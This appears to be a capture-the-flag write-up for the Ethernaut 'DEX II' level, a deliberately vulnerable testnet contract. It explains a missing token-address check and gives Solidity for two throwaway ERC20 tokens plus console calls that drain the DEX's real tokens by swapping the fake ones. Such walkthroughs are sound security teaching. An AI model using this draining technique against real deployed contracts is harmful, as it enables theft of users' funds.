# [23. DEX II](https://ethernaut.openzeppelin.com/level/0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a)

Here we have another DEX similar to the previous level, but this one requires both tokens to be depleted. There is one subtle yet crucial difference within the `swap` function, it does not check the validity of token addresses! In the previous one, we had a `require` statement checking that both `from` and `to` tokens are that of either tokens the DEX is responsible of. This gives us an idea of an attack, creating our own tokens and somehow use them to drain the DEX of its tokens.

Again, we have 10 of each token and the DEX has 100 of each. We will create Token 3 and Token 4, and let DEX have 100 of each. We will then make the following trades:

- Send 100 Token 3 to get 100 Token 1. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.
- Send 100 Token 4 to get 100 Token 2. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.

This way, the tokens will be depleted by our worthless and arbitrarily created tokens! We use Remix to create [Token 3](0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B) and [Token 4](https://rinkeby.etherscan.io/address/0xc975954d79412d58746240c536220192485AECBB):

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract MyToken3 is ERC20 {
  constructor() ERC20("MyToken3", "MT3") {
    _mint(msg.sender, 1000);
  }
}
contract MyToken4 is ERC20 {
  constructor() ERC20("MyToken4", "MT4") {
    _mint(msg.sender, 1000);
  }
}
```

After deploying the tokens, transfer 100 of each token to the DEX address, and also give an allowance of 100 of both tokens to the DEX. The actual trades are then simply as follows:

```js
// settings
const amount = 100
const T1 = await contract.token1()
const T2 = await contract.token2()
const T3 = "0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B" // my Token 3
const T4 = "0xc975954d79412d58746240c536220192485AECBB" // my Token 4

// deplete Token 1
// DEX must have 'amount' T3, and also 'amount' allowance to take T3 from you
await contract.swap(T3, T1, amount)
// deplete Token 2
// DEX must have 'amount' T4, and also 'amount' allowance to take T4 from you
await contract.swap(T4, T2, amount)
```

To confirm the depletion, check the balances:

```js
(await contract.balanceOf(await contract.token1(), contract.address)).toNumber()
(await contract.balanceOf(await contract.token2(), contract.address)).toNumber()
```

That is all!
